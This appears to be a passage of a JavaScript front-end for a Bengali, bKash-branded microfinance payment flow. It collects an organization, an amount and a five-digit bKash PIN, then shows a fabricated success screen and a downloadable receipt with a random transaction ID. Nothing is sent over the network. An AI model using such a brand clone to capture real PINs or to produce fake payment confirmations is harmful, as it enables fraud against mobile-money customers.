// Part 1: Main Setup and Initialization
document.addEventListener("DOMContentLoaded", function () {
  // Initialize main containers and variables
  const mainContainer = document.getElementById("mainContainer");
  let currentPopup = null;
  let currentStep = 0;
  let selectedOrganization = null;
  let paymentAmount = null;
  let transactionPin = null;

  // Add click event listeners to all organization items
  const organizationItems = document.querySelectorAll(".organization-item");
  organizationItems.forEach((item) => {
    item.addEventListener("click", function () {
      // Get organization details
      const orgLogo = this.querySelector(".organization-logo img").src;
      const orgName = this.querySelector(".organization-name").textContent;
      selectedOrganization = {
        name: orgName,
        logo: orgLogo,
      };

      // Open first popup (organization selection)
      openOrganizationPopup(selectedOrganization);
    });
  });

  // Add click event to back button in header
  document.addEventListener("click", function (e) {
    if (e.target.closest(".back-button")) {
      handleBackNavigation();
    }
  });

  // Back navigation handler
  function handleBackNavigation() {
    if (currentStep > 0) {
      currentStep--;

      // Navigate to previous step
      switch (currentStep) {
        case 0:
          // Close all popups and return to main page
          closeAllPopups();
          break;
        case 1:
          openOrganizationPopup(selectedOrganization);
          break;
        case 2:
          openAmountInputPopup(selectedOrganization);
          break;
        case 3:
          openPinInputPopup(selectedOrganization, paymentAmount);
          break;
      }
    } else {
      closeAllPopups();
    }
  }

  // Close all popups and reset state
  function closeAllPopups() {
    if (currentPopup) {
      document.body.removeChild(currentPopup);
      currentPopup = null;
    }
    currentStep = 0;
  }

  // Part 2: Popup Creation Functions
  // Create base popup structure with header
  function createBasePopup() {
    closeAllPopups(); // Close any existing popup

    const popup = document.createElement("div");
    popup.className = "microfinance-container";
    popup.style.height = "80vh";
    popup.style.zIndex = "1000";

    // Create header
    const header = document.createElement("div");
    header.className = "form-header-gradient";

    const headerContent = document.createElement("div");
    headerContent.className = "header-content";

    // Back button
    const backButton = document.createElement("div");
    backButton.className = "back-button";
    const backIcon = document.createElement("img");
    backIcon.src = "images/icons/back-icon.png";
    backIcon.style.height = "24px";
    backIcon.style.width = "24px";
    backIcon.style.objectFit = "contain";
    backButton.appendChild(backIcon);

    // Title
    const headerTitle = document.createElement("div");
    headerTitle.className = "header-title";
    const title = document.createElement("h3");
    title.textContent = "মাইক্রোফাইন্যান্স";
    headerTitle.appendChild(title);

    // Logo
    const logoContainer = document.createElement("div");
    logoContainer.className = "bkash-logo";
    const logo = document.createElement("img");
    logo.src = "/public/images/bkashlogo.png";
    logo.style.height = "40px";
    logoContainer.appendChild(logo);

    // Assemble header
    headerContent.appendChild(backButton);
    headerContent.appendChild(headerTitle);
    headerContent.appendChild(logoContainer);
    header.appendChild(headerContent);

    popup.appendChild(header);

    // Create content container
    const content = document.createElement("div");
    content.className = "microfinance-content";
    content.style.backgroundColor = "white";
    content.style.padding = "20px";
    popup.appendChild(content);

    document.body.appendChild(popup);
    currentPopup = popup;

    return { popup, content };
  }

  // Popup 1: Organization details
  function openOrganizationPopup(org) {
    currentStep = 1;
    const { content } = createBasePopup();

    // Create organization info section
    const orgInfo = document.createElement("div");
    orgInfo.style.textAlign = "center";
    orgInfo.style.marginBottom = "30px";

    const orgLogo = document.createElement("div");
    orgLogo.style.width = "80px";
    orgLogo.style.height = "80px";
    orgLogo.style.margin = "0 auto 15px";
    orgLogo.style.border = "1px solid #eee";
    orgLogo.style.borderRadius = "8px";
    orgLogo.style.padding = "10px";

    const logoImg = document.createElement("img");
    logoImg.src = org.logo;
    logoImg.style.width = "100%";
    logoImg.style.height = "100%";
    logoImg.style.objectFit = "contain";
    orgLogo.appendChild(logoImg);

    const orgName = document.createElement("h3");
    orgName.textContent = org.name;
    orgName.style.fontSize = "18px";
    orgName.style.fontWeight = "600";
    orgName.style.color = "#333";

    orgInfo.appendChild(orgLogo);
    orgInfo.appendChild(orgName);
    content.appendChild(orgInfo);

    // Create form
    const form = document.createElement("form");
    form.id = "organizationForm";

    // Create unique ID input field
    const idField = createFormGroup("unique-id", "ইউনিক আইডি", "number");
    form.appendChild(idField);

    // Create membership number input field
    const memberField = createFormGroup(
      "member-number",
      "সদস্য নম্বর",
      "number"
    );
    form.appendChild(memberField);

    // Information text
    const infoText = document.createElement("div");
    infoText.className = "info-text";
    infoText.style.backgroundColor = "#FFF5F8";
    infoText.style.padding = "15px";
    infoText.style.borderRadius = "8px";
    infoText.style.margin = "20px 0";
    infoText.style.display = "flex";
    infoText.style.alignItems = "center";

    const infoIcon = document.createElement("div");
    infoIcon.innerHTML =
      '<i class="fas fa-lightbulb" style="color: #1c2e58; font-size: 18px;"></i>';
    infoIcon.style.marginRight = "10px";

    const infoContent = document.createElement("p");
    infoContent.textContent =
      "পরবর্তী ক্লিকগুলোতে প্রদত্ত তথ্য উক্ত প্রতিষ্ঠান কর্তৃক সদস্যের পরিচয় যাচাইয়ের জন্য ব্যবহার করা হবে।";
    infoContent.style.margin = "0";
    infoContent.style.fontSize = "14px";
    infoContent.style.color = "#555";

    infoText.appendChild(infoIcon);
    infoText.appendChild(infoContent);
    form.appendChild(infoText);

    // Submit button
    const buttonContainer = document.createElement("div");
    buttonContainer.style.marginTop = "20px";

    const submitButton = document.createElement("button");
    submitButton.type = "button"; // Prevent form submission
    submitButton.className = "submit-button";
    submitButton.textContent = "এগিয়ে যান";
    submitButton.style.backgroundColor = "#e2146c";
    submitButton.style.color = "white";
    submitButton.style.border = "none";
    submitButton.style.borderRadius = "30px";
    submitButton.style.padding = "12px 20px";
    submitButton.style.width = "100%";
    submitButton.style.fontWeight = "500";
    submitButton.style.fontSize = "16px";
    submitButton.style.cursor = "pointer";

    submitButton.addEventListener("click", function () {
      // Navigate to amount input screen
      openAmountInputPopup(org);
    });

    buttonContainer.appendChild(submitButton);
    form.appendChild(buttonContainer);

    content.appendChild(form);
  }

  // Part 3: Form Input Functions
  // Popup 2: Amount input
  function openAmountInputPopup(org) {
    currentStep = 2;
    const { content } = createBasePopup();

    // Create form
    const form = document.createElement("form");
    form.id = "amountForm";

    // Title
    const title = document.createElement("h3");
    title.textContent = "পেমেন্ট পরিমাণ";
    title.style.fontSize = "18px";
    title.style.fontWeight = "600";
    title.style.marginBottom = "20px";
    title.style.color = "#333";
    form.appendChild(title);

    // Organization info (smaller version)
    const orgInfo = document.createElement("div");
    orgInfo.style.display = "flex";
    orgInfo.style.alignItems = "center";
    orgInfo.style.padding = "15px";
    orgInfo.style.backgroundColor = "#f8f8f8";
    orgInfo.style.borderRadius = "8px";
    orgInfo.style.marginBottom = "20px";

    const smallLogo = document.createElement("div");
    smallLogo.style.width = "40px";
    smallLogo.style.height = "40px";
    smallLogo.style.marginRight = "10px";
    smallLogo.style.border = "1px solid #eee";
    smallLogo.style.borderRadius = "6px";
    smallLogo.style.backgroundColor = "white";
    smallLogo.style.padding = "5px";

    const logoImg = document.createElement("img");
    logoImg.src = org.logo;
    logoImg.style.width = "100%";
    logoImg.style.height = "100%";
    logoImg.style.objectFit = "contain";
    smallLogo.appendChild(logoImg);

    const orgName = document.createElement("span");
    orgName.textContent = org.name;
    orgName.style.fontSize = "16px";
    orgName.style.fontWeight = "500";

    orgInfo.appendChild(smallLogo);
    orgInfo.appendChild(orgName);
    form.appendChild(orgInfo);

    // Amount input
    const amountGroup = document.createElement("div");
    amountGroup.className = "form-group";
    amountGroup.style.marginBottom = "20px";

    const amountLabel = document.createElement("label");
    amountLabel.htmlFor = "amount";
    amountLabel.textContent = "টাকার পরিমাণ";
    amountLabel.style.display = "block";
    amountLabel.style.marginBottom = "8px";
    amountLabel.style.fontSize = "16px";
    amountLabel.style.fontWeight = "500";

    const amountInputContainer = document.createElement("div");
    amountInputContainer.style.position = "relative";

    const amountInput = document.createElement("input");
    amountInput.type = "number";
    amountInput.id = "amount";
    amountInput.name = "amount";
    amountInput.placeholder = "টাকার পরিমাণ লিখুন";
    amountInput.required = true;
    amountInput.style.width = "100%";
    amountInput.style.padding = "12px 40px 12px 12px";
    amountInput.style.fontSize = "16px";
    amountInput.style.border = "1px solid #ddd";
    amountInput.style.borderRadius = "8px";
    amountInput.style.boxSizing = "border-box";

    const currencySymbol = document.createElement("span");
    currencySymbol.textContent = "৳";
    currencySymbol.style.position = "absolute";
    currencySymbol.style.right = "12px";
    currencySymbol.style.top = "50%";
    currencySymbol.style.transform = "translateY(-50%)";
    currencySymbol.style.fontSize = "16px";
    currencySymbol.style.color = "#555";

    amountInputContainer.appendChild(amountInput);
    amountInputContainer.appendChild(currencySymbol);

    amountGroup.appendChild(amountLabel);
    amountGroup.appendChild(amountInputContainer);
    form.appendChild(amountGroup);

    // Info text
    const infoText = document.createElement("div");
    infoText.className = "info-text";
    infoText.style.backgroundColor = "#FFF5F8";
    infoText.style.padding = "15px";
    infoText.style.borderRadius = "8px";
    infoText.style.margin = "20px 0";
    infoText.style.display = "flex";
    infoText.style.alignItems = "center";

    const infoIcon = document.createElement("div");
    infoIcon.innerHTML =
      '<i class="fas fa-lightbulb" style="color: #1c2e58; font-size: 18px;"></i>';
    infoIcon.style.marginRight = "10px";

    const infoContent = document.createElement("p");
    infoContent.textContent =
      "পরবর্তী ক্লিকগুলোতে প্রদত্ত তথ্য উক্ত প্রতিষ্ঠান কর্তৃক সদস্যের পরিচয় যাচাইয়ের জন্য ব্যবহার করা হবে।";
    infoContent.style.margin = "0";
    infoContent.style.fontSize = "14px";
    infoContent.style.color = "#555";

    infoText.appendChild(infoIcon);
    infoText.appendChild(infoContent);
    form.appendChild(infoText);

    // Submit button
    const buttonContainer = document.createElement("div");
    buttonContainer.style.marginTop = "20px";

    const submitButton = document.createElement("button");
    submitButton.type = "button";
    submitButton.className = "submit-button";
    submitButton.textContent = "এগিয়ে যান";
    submitButton.style.backgroundColor = "#e2146c";
    submitButton.style.color = "white";
    submitButton.style.border = "none";
    submitButton.style.borderRadius = "30px";
    submitButton.style.padding = "12px 20px";
    submitButton.style.width = "100%";
    submitButton.style.fontWeight = "500";
    submitButton.style.fontSize = "16px";
    submitButton.style.cursor = "pointer";

    submitButton.addEventListener("click", function () {
      if (amountInput.value) {
        paymentAmount = amountInput.value;
        openPinInputPopup(org, paymentAmount);
      } else {
        // Show validation error
        amountInput.style.border = "1px solid #1c2e58";
        const errorMsg = document.createElement("p");
        errorMsg.textContent = "টাকার পরিমাণ লিখুন";
        errorMsg.style.color = "#e2146c";
        errorMsg.style.fontSize = "12px";
        errorMsg.style.margin = "5px 0 0";

        // Remove existing error message if any
        const existingError = amountGroup.querySelector("p");
        if (existingError) {
          amountGroup.removeChild(existingError);
        }

        amountGroup.appendChild(errorMsg);
      }
    });

    buttonContainer.appendChild(submitButton);
    form.appendChild(buttonContainer);

    content.appendChild(form);
  }

  // Part 4: Pin Input and Processing
  // Popup 3: PIN input
  function openPinInputPopup(org, amount) {
    currentStep = 3;
    const { content } = createBasePopup();

    // Create form
    const form = document.createElement("form");
    form.id = "pinForm";

    // Title
    const title = document.createElement("h3");
    title.textContent = "পিন ইনপুট";
    title.style.fontSize = "18px";
    title.style.fontWeight = "600";
    title.style.marginBottom = "20px";
    title.style.color = "#333";
    form.appendChild(title);

    // Transaction details
    const transactionDetails = document.createElement("div");
    transactionDetails.style.backgroundColor = "#f8f8f8";
    transactionDetails.style.padding = "15px";
    transactionDetails.style.borderRadius = "8px";
    transactionDetails.style.marginBottom = "20px";

    // Organization
    const orgDetails = document.createElement("div");
    orgDetails.style.display = "flex";
    orgDetails.style.alignItems = "center";
    orgDetails.style.marginBottom = "10px";

    const orgLabel = document.createElement("span");
    orgLabel.textContent = "প্রতিষ্ঠান:";
    orgLabel.style.width = "100px";
    orgLabel.style.color = "#666";

    const orgValue = document.createElement("span");
    orgValue.textContent = org.name;
    orgValue.style.fontWeight = "500";

    orgDetails.appendChild(orgLabel);
    orgDetails.appendChild(orgValue);

    // Amount
    const amountDetails = document.createElement("div");
    amountDetails.style.display = "flex";
    amountDetails.style.alignItems = "center";

    const amountLabel = document.createElement("span");
    amountLabel.textContent = "পরিমাণ:";
    amountLabel.style.width = "100px";
    amountLabel.style.color = "#666";

    const amountValue = document.createElement("span");
    amountValue.textContent = amount + " ৳";
    amountValue.style.fontWeight = "500";

    amountDetails.appendChild(amountLabel);
    amountDetails.appendChild(amountValue);

    transactionDetails.appendChild(orgDetails);
    transactionDetails.appendChild(amountDetails);
    form.appendChild(transactionDetails);

    // PIN input
    const pinGroup = document.createElement("div");
    pinGroup.className = "form-group";
    pinGroup.style.marginBottom = "20px";

    const pinLabel = document.createElement("label");
    pinLabel.htmlFor = "pin";
    pinLabel.textContent = "আপনার বিকাশ পিন দিন";
    pinLabel.style.display = "block";
    pinLabel.style.marginBottom = "8px";
    pinLabel.style.fontSize = "16px";
    pinLabel.style.fontWeight = "500";

    // Create PIN input fields (5 digits)
    const pinFieldsContainer = document.createElement("div");
    pinFieldsContainer.style.display = "flex";
    pinFieldsContainer.style.justifyContent = "space-between";

    const pinFields = [];

    for (let i = 0; i < 5; i++) {
      const pinField = document.createElement("input");
      pinField.type = "password";
      pinField.maxLength = 1;
      pinField.className = "pin-digit";
      pinField.style.width = "45px";
      pinField.style.height = "45px";
      pinField.style.textAlign = "center";
      pinField.style.fontSize = "20px";
      pinField.style.fontWeight = "bold";
      pinField.style.border = "1px solid #ddd";
      pinField.style.borderRadius = "8px";

      // Auto-focus next field
      pinField.addEventListener("input", function () {
        if (this.value.length === 1) {
          const index = pinFields.indexOf(this);
          if (index < pinFields.length - 1) {
            pinFields[index + 1].focus();
          }
        }
      });

      // Allow backspace to go to previous field
      pinField.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && this.value.length === 0) {
          const index = pinFields.indexOf(this);
          if (index > 0) {
            pinFields[index - 1].focus();
          }
        }
      });

      pinFields.push(pinField);
      pinFieldsContainer.appendChild(pinField);
    }

    pinGroup.appendChild(pinLabel);
    pinGroup.appendChild(pinFieldsContainer);
    form.appendChild(pinGroup);

    // Submit button
    const buttonContainer = document.createElement("div");
    buttonContainer.style.marginTop = "30px";

    const submitButton = document.createElement("button");
    submitButton.type = "button";
    submitButton.className = "submit-button";
    submitButton.textContent = "এগিয়ে যান";
    submitButton.style.backgroundColor = "#e2146c";
    submitButton.style.color = "white";
    submitButton.style.border = "none";
    submitButton.style.borderRadius = "30px";
    submitButton.style.padding = "12px 20px";
    submitButton.style.width = "100%";
    submitButton.style.fontWeight = "500";
    submitButton.style.fontSize = "16px";
    submitButton.style.cursor = "pointer";

    submitButton.addEventListener("click", function () {
      // Validate all PIN fields are filled
      const allFilled = pinFields.every((field) => field.value.length === 1);

      if (allFilled) {
        transactionPin = pinFields.map((field) => field.value).join("");
        openSuccessPopup(org, amount);
      } else {
        // Show validation error
        pinFields.forEach((field) => {
          if (field.value.length === 0) {
            field.style.border = "1px solid #1c2e58";
          }
        });

        // Error message
        const errorMsg = document.createElement("p");
        errorMsg.textContent = "সম্পূর্ণ পিন দিন";
        errorMsg.style.color = "#e2146c";
        errorMsg.style.fontSize = "12px";
        errorMsg.style.margin = "5px 0 0";
        errorMsg.style.textAlign = "center";

        // Remove existing error message if any
        const existingError = pinGroup.querySelector("p");
        if (existingError) {
          pinGroup.removeChild(existingError);
        }

        pinGroup.appendChild(errorMsg);
      }
    });

    buttonContainer.appendChild(submitButton);
    form.appendChild(buttonContainer);

    content.appendChild(form);

    // Focus on first PIN field
    pinFields[0].focus();
  }

  // Part 5: Success and Helper Functions
  // Popup 4: Success screen
  function openSuccessPopup(org, amount) {
    currentStep = 4;
    const { content } = createBasePopup();

    // Create success UI
    const successContainer = document.createElement("div");
    successContainer.style.textAlign = "center";
    successContainer.style.padding = "20px 0";

    // Success icon
    const successIcon = document.createElement("div");
    successIcon.style.width = "80px";
    successIcon.style.height = "80px";
    successIcon.style.margin = "0 auto 20px";
    successIcon.style.backgroundColor = "#E8F6EE";
    successIcon.style.borderRadius = "50%";
    successIcon.style.display = "flex";
    successIcon.style.alignItems = "center";
    successIcon.style.justifyContent = "center";

    const iconInner = document.createElement("div");
    iconInner.innerHTML =
      '<i class="fas fa-check" style="color: #00A650; font-size: 40px;"></i>';
    successIcon.appendChild(iconInner);

    // Success text
    const successTitle = document.createElement("h3");
    successTitle.textContent = "পেমেন্ট সফল হয়েছে!";
    successTitle.style.fontSize = "20px";
    successTitle.style.fontWeight = "600";
    successTitle.style.color = "#00A650";
    successTitle.style.marginBottom = "5px";

    const successSubtitle = document.createElement("p");
    successSubtitle.textContent = "আপনার পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।";
    successSubtitle.style.fontSize = "16px";
    successSubtitle.style.color = "#555";
    successSubtitle.style.marginBottom = "30px";

    successContainer.appendChild(successIcon);
    successContainer.appendChild(successTitle);
    successContainer.appendChild(successSubtitle);

    // Transaction details
    const transactionDetails = document.createElement("div");
    transactionDetails.style.backgroundColor = "#f8f8f8";
    transactionDetails.style.padding = "20px";
    transactionDetails.style.borderRadius = "8px";
    transactionDetails.style.marginBottom = "30px";
    transactionDetails.style.textAlign = "left";

    // Transaction ID
    const txnId =
      "TXN" +
      Math.floor(Math.random() * 1000000000)
        .toString()
        .padStart(9, "0");

    const txnDetails = document.createElement("div");
    txnDetails.style.marginBottom = "15px";

    const txnLabel = document.createElement("div");
    txnLabel.textContent = "ট্রানজেকশন আইডি";
    txnLabel.style.fontSize = "14px";
    txnLabel.style.color = "#666";
    txnLabel.style.marginBottom = "5px";

    const txnValue = document.createElement("div");
    txnValue.textContent = txnId;
    txnValue.style.fontSize = "16px";
    txnValue.style.fontWeight = "600";

    txnDetails.appendChild(txnLabel);
    txnDetails.appendChild(txnValue);

    // Date & Time
    const dateDetails = document.createElement("div");
    dateDetails.style.marginBottom = "15px";

    const dateLabel = document.createElement("div");
    dateLabel.textContent = "তারিখ ও সময়";
    dateLabel.style.fontSize = "14px";
    dateLabel.style.color = "#666";
    dateLabel.style.marginBottom = "5px";

    const now = new Date();
    const dateStr =
      now.toLocaleDateString("bn-BD", {
        year: "numeric",
        month: "long",
        day: "numeric",
      }) +
      ", " +
      now.toLocaleTimeString("bn-BD");

    const dateValue = document.createElement("div");
    dateValue.textContent = dateStr;
    dateValue.style.fontSize = "16px";
    dateValue.style.fontWeight = "500";

    dateDetails.appendChild(dateLabel);
    dateDetails.appendChild(dateValue);

    // Organization
    const orgDetails = document.createElement("div");
    orgDetails.style.marginBottom = "15px";

    const orgLabel = document.createElement("div");
    orgLabel.textContent = "প্রতিষ্ঠান";
    orgLabel.style.fontSize = "14px";
    orgLabel.style.color = "#666";
    orgLabel.style.marginBottom = "5px";

    const orgValue = document.createElement("div");
    orgValue.textContent = org.name;
    orgValue.style.fontSize = "16px";
    orgValue.style.fontWeight = "500";

    orgDetails.appendChild(orgLabel);
    orgDetails.appendChild(orgValue);

    // Amount
    const amountDetails = document.createElement("div");

    const amountLabel = document.createElement("div");
    amountLabel.textContent = "পরিমাণ";
    amountLabel.style.fontSize = "14px";
    amountLabel.style.color = "#666";
    amountLabel.style.marginBottom = "5px";

    const amountValue = document.createElement("div");
    amountValue.textContent = amount + " ৳";
    amountValue.style.fontSize = "18px";
    amountValue.style.fontWeight = "600";
    amountValue.style.color = "#e2146c";

    amountDetails.appendChild(amountLabel);
    amountDetails.appendChild(amountValue);

    transactionDetails.appendChild(txnDetails);
    transactionDetails.appendChild(dateDetails);
    transactionDetails.appendChild(orgDetails);
    transactionDetails.appendChild(amountDetails);

    successContainer.appendChild(transactionDetails);

    // Action buttons
    const buttonsContainer = document.createElement("div");
    buttonsContainer.style.display = "flex";
    buttonsContainer.style.gap = "15px";

    // Download receipt button
    const downloadButton = document.createElement("button");
    downloadButton.type = "button";
    downloadButton.className = "download-button";
    downloadButton.textContent = "ডাউনলোড";
    downloadButton.style.flex = "1";
    downloadButton.style.backgroundColor = "white";
    downloadButton.style.color = "#e2146c";
    downloadButton.style.border = "1px solid #1c2e58";
    downloadButton.style.borderRadius = "30px";
    downloadButton.style.padding = "12px 20px";
    downloadButton.style.fontWeight = "500";
    downloadButton.style.fontSize = "16px";
    downloadButton.style.cursor = "pointer";

    // Download functionality
    downloadButton.addEventListener("click", function () {
      // Create receipt HTML
      const receiptHTML = `
                <!DOCTYPE html>
                <html lang="bn">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>রিসিট - ${txnId}</title>
                    <style>
                        body {
                            font-family: 'Hind Siliguri', sans-serif;
                            margin: 0;
                            padding: 20px;
                            color: #333;
                            background-color: #f5f5f5;
                        }
                        .receipt {
                            max-width: 500px;
                            margin: 0 auto;
                            background: white;
                            border-radius: 10px;
                            overflow: hidden;
                            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                        }
                        .receipt-header {
                             background: linear-gradient(135deg, #1c2e58 0%, #112555 100%);
                            color: white;
                            padding: 20px;
                            text-align: center;
                            position: relative;
                        }
                        .receipt-header::before {
                            content: "";
                            position: absolute;
                            top: 0;
                            right: 0;
                            bottom: 0;
                            left: 0;
                            background: radial-gradient(circle at top right, rgba(255,255,255,0.15), transparent 70%);
                        }
                        .receipt-logo {
                            height: 40px;
                            margin-bottom: 10px;
                        }
                        .receipt-title {
                            font-size: 22px;
                            font-weight: 600;
                            margin: 0;
                            position: relative;
                        }
                        .receipt-body {
                            padding: 20px;
                        }
                        .success-message {
                            text-align: center;
                            margin-bottom: 20px;
                        }
                        .success-icon {
                            width: 60px;
                            height: 60px;
                            background-color: #E8F6EE;
                            border-radius: 50%;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            margin: 0 auto 15px;
                            font-size: 30px;
                            color: #00A650;
                        }
                        .success-text {
                            color: #00A650;
                            font-size: 18px;
                            font-weight: 600;
                            margin: 0 0 5px;
                        }
                        .details-section {
                            background-color: #f8f8f8;
                            border-radius: 8px;
                            padding: 15px;
                            margin-bottom: 20px;
                        }
                        .detail-item {
                            margin-bottom: 12px;
                        }
                        .detail-item:last-child {
                            margin-bottom: 0;
                        }
                        .detail-label {
                            font-size: 14px;
                            color: #666;
                            margin-bottom: 4px;
                        }
                        .detail-value {
                            font-size: 16px;
                            font-weight: 500;
                        }
                        .amount-value {
                            font-size: 18px;
                            font-weight: 600;
                            color: #1c2e58;
                        }
                        .receipt-footer {
                            text-align: center;
                            padding: 0 20px 20px;
                            color: #666;
                            font-size: 14px;
                        }
                    </style>
                </head>
                <body>
                    <div class="receipt">
                        <div class="receipt-header">
                            <img src="/public/images/bkashlogo.png" alt="বিকাশ লোগো" class="receipt-logo">
                            <h1 class="receipt-title">পেমেন্ট রিসিট</h1>
                        </div>
                        <div class="receipt-body">
                            <div class="success-message">
                                <div class="success-icon">✓</div>
                                <h2 class="success-text">পেমেন্ট সফল হয়েছে!</h2>
                                <p>আপনার পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।</p>
                            </div>
                            
                            <div class="details-section">
                                <div class="detail-item">
                                    <div class="detail-label">ট্রানজেকশন আইডি</div>
                                    <div class="detail-value">${txnId}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">তারিখ ও সময়</div>
                                    <div class="detail-value">${dateStr}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">প্রতিষ্ঠান</div>
                                    <div class="detail-value">${org.name}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">পরিমাণ</div>
                                    <div class="amount-value">${amount} ৳</div>
                                </div>
                            </div>
                        </div>
                        <div class="receipt-footer">
                            <p>ধন্যবাদ বিকাশ ব্যবহার করার জন্য</p>
                        </div>
                    </div>
                </body>
                </html>
            `;

      // Create file for download
      const blob = new Blob([receiptHTML], { type: "text/html" });
      const url = window.URL.createObjectURL(blob);

      // Create download link and trigger click
      const a = document.createElement("a");
      a.href = url;
      a.download = `receipt-${txnId}.html`;
      document.body.appendChild(a);
      a.click();

      // Clean up
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    });

    // OK button
    const okButton = document.createElement("button");
    okButton.type = "button";
    okButton.className = "ok-button";
    okButton.textContent = "ঠিক আছে";
    okButton.style.flex = "1";
    okButton.style.backgroundColor = "#e2146c";
    okButton.style.color = "white";
    okButton.style.border = "none";
    okButton.style.borderRadius = "30px";
    okButton.style.padding = "12px 20px";
    okButton.style.fontWeight = "500";
    okButton.style.fontSize = "16px";
    okButton.style.cursor = "pointer";

    okButton.addEventListener("click", function () {
      // Return to main screen
      closeAllPopups();
    });

    buttonsContainer.appendChild(downloadButton);
    buttonsContainer.appendChild(okButton);

    successContainer.appendChild(buttonsContainer);
    content.appendChild(successContainer);
  }

  // Helper functions for form creation
  function createFormGroup(id, label, type = "text") {
    const group = document.createElement("div");
    group.className = "form-group";
    group.style.marginBottom = "20px";

    const labelElement = document.createElement("label");
    labelElement.htmlFor = id;
    labelElement.textContent = label;
    labelElement.style.display = "block";
    labelElement.style.marginBottom = "8px";
    labelElement.style.fontSize = "16px";
    labelElement.style.fontWeight = "500";

    const inputContainer = document.createElement("div");
    inputContainer.className = "input-container";
    inputContainer.style.position = "relative";

    const input = document.createElement("input");
    input.type = type;
    input.id = id;
    input.name = id;
    input.required = true;
    input.style.width = "100%";
    input.style.padding = "12px";
    input.style.fontSize = "16px";
    input.style.border = "1px solid #ddd";
    input.style.borderRadius = "8px";
    input.style.boxSizing = "border-box";

    // Add eye icon for password/pin fields
    if (type === "password") {
      input.style.paddingRight = "40px";

      const eyeIcon = document.createElement("div");
      eyeIcon.className = "eye-icon";
      eyeIcon.innerHTML = '<i class="fas fa-eye"></i>';
      eyeIcon.style.position = "absolute";
      eyeIcon.style.top = "50%";
      eyeIcon.style.right = "12px";
      eyeIcon.style.transform = "translateY(-50%)";
      eyeIcon.style.color = "#999";
      eyeIcon.style.cursor = "pointer";

      eyeIcon.addEventListener("click", function () {
        if (input.type === "password") {
          input.type = "text";
          eyeIcon.innerHTML = '<i class="fas fa-eye-slash"></i>';
        } else {
          input.type = "password";
          eyeIcon.innerHTML = '<i class="fas fa-eye"></i>';
        }
      });

      inputContainer.appendChild(eyeIcon);
    }

    inputContainer.appendChild(input);
    group.appendChild(labelElement);
    group.appendChild(inputContainer);

    return group;
  }

  // Initialize any event listeners for receipt section
  const receiptSection = document.querySelector(".receipt-section");
  if (receiptSection) {
    receiptSection.addEventListener("click", function () {
      // Open receipts history page
      openReceiptsHistoryPopup();
    });
  }

  // Receipts history popup
  function openReceiptsHistoryPopup() {
    const { content } = createBasePopup();

    // Create receipts list
    const receiptsContainer = document.createElement("div");
    receiptsContainer.style.padding = "15px 0";

    const title = document.createElement("h3");
    title.textContent = "আপনার রিসিটসমূহ";
    title.style.fontSize = "18px";
    title.style.fontWeight = "600";
    title.style.marginBottom = "20px";
    title.style.padding = "0 15px";
    title.style.color = "#333";

    receiptsContainer.appendChild(title);

    // Mock data for recent transactions
    const mockTransactions = [
      {
        id: "TXN983218371",
        date: "২৯ এপ্রিল, ২০২৫",
        organization: "ব্র্যাক",
        amount: "1,000",
        logo: "images/microfinance/brac.png",
      },
      {
        id: "TXN871928371",
        date: "২৫ এপ্রিল, ২০২৫",
        organization: "ব্যুরো বাংলাদেশ",
        amount: "1,500",
        logo: "images/microfinance/buro.png",
      },
      {
        id: "TXN762937192",
        date: "২০ এপ্রিল, ২০২৫",
        organization: "শক্তি ফাউন্ডেশন",
        amount: "2,000",
        logo: "images/microfinance/shakti.png",
      },
    ];

    // Create receipt items
    mockTransactions.forEach((transaction) => {
      const receiptItem = document.createElement("div");
      receiptItem.className = "receipt-item";
      receiptItem.style.display = "flex";
      receiptItem.style.alignItems = "center";
      receiptItem.style.padding = "15px";
      receiptItem.style.borderBottom = "1px solid #eee";
      receiptItem.style.backgroundColor = "white";
      receiptItem.style.cursor = "pointer";

      // Organization logo
      const orgLogo = document.createElement("div");
      orgLogo.style.width = "40px";
      orgLogo.style.height = "40px";
      orgLogo.style.marginRight = "15px";
      orgLogo.style.border = "1px solid #eee";
      orgLogo.style.borderRadius = "6px";
      orgLogo.style.overflow = "hidden";
      orgLogo.style.backgroundColor = "white";

      const logoImg = document.createElement("img");
      logoImg.src = transaction.logo;
      logoImg.style.width = "100%";
      logoImg.style.height = "100%";
      logoImg.style.objectFit = "contain";
      orgLogo.appendChild(logoImg);

      // Receipt details
      const receiptDetails = document.createElement("div");
      receiptDetails.style.flex = "1";

      const orgName = document.createElement("div");
      orgName.textContent = transaction.organization;
      orgName.style.fontWeight = "500";
      orgName.style.marginBottom = "3px";

      const receiptInfo = document.createElement("div");
      receiptInfo.style.display = "flex";
      receiptInfo.style.fontSize = "13px";
      receiptInfo.style.color = "#666";

      const txnId = document.createElement("span");
      txnId.textContent = transaction.id;
      txnId.style.marginRight = "10px";

      const date = document.createElement("span");
      date.textContent = transaction.date;

      receiptInfo.appendChild(txnId);
      receiptInfo.appendChild(date);

      receiptDetails.appendChild(orgName);
      receiptDetails.appendChild(receiptInfo);

      // Amount
      const amount = document.createElement("div");
      amount.textContent = transaction.amount + " ৳";
      amount.style.fontWeight = "600";
      amount.style.color = "#e2146c";
      amount.style.fontSize = "16px";

      receiptItem.appendChild(orgLogo);
      receiptItem.appendChild(receiptDetails);
      receiptItem.appendChild(amount);

      receiptItem.addEventListener("click", function () {
        // Mock opening a specific receipt
        openReceiptDetailsPopup(transaction);
      });

      receiptsContainer.appendChild(receiptItem);
    });

    // Add message if no receipts
    if (mockTransactions.length === 0) {
      const emptyState = document.createElement("div");
      emptyState.style.textAlign = "center";
      emptyState.style.padding = "40px 20px";

      const emptyIcon = document.createElement("div");
      emptyIcon.innerHTML =
        '<i class="fas fa-receipt" style="font-size: 40px; color: #ccc;"></i>';
      emptyIcon.style.marginBottom = "15px";

      const emptyText = document.createElement("p");
      emptyText.textContent = "কোন রিসিট পাওয়া যায়নি";
      emptyText.style.color = "#666";

      emptyState.appendChild(emptyIcon);
      emptyState.appendChild(emptyText);

      receiptsContainer.appendChild(emptyState);
    }

